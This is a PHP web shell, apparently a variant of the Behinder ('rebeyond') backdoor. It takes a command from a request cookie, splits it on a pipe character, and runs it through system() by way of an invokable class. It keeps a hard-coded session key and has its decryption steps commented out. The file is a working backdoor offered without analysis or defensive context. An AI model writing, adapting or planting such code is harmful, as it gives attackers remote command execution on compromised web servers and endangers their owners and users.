<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
// 	$post=file_get_contents("php://input");
    $post=$_COOKIE[0];
	if(!extension_loaded('openssl'))
	{
		//$post=base64_decode($post);

		for($i=0;$i<strlen($post);$i++) {
    			 //$post[$i] = $post[$i]^$key[$i+1&15];
    	}
	}
	else
	{
		//$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {system($p);}}
    @call_user_func(new C(),$params);
?>